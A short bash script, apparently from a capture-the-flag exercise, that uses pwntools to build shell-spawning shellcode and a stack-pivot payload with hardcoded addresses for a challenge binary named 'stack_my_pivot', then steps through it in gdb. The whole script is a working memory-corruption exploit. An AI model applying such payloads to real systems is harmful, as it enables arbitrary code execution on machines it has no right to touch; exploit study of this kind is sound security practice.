#!/bin/bash

python3 << 'EOF'
from pwn import *
context.arch = 'amd64'

shellcode = asm(shellcraft.sh())
first_input = shellcode.ljust(50, b'\x90')

second_input = b'\x90' * 8 + p64(0x400738) + b'\xeb\xa6' + b'\x90' * 6 + p32(0x40072e)

with open('/tmp/sigill_input', 'wb') as f:
    f.write(first_input + second_input)
EOF

gdb -batch \
  -ex 'break *0x40072e' \
  -ex 'break *0x400738' \
  -ex 'run < /tmp/sigill_input' \
  -ex 'continue' \
  -ex 'info registers rsp rip' \
  -ex 'x/10i $rsp' \
  -ex 'stepi' \
  -ex 'info registers rsp rip' \
  -ex 'x/10i $rip' \
  ./stack_my_pivot 2>&1
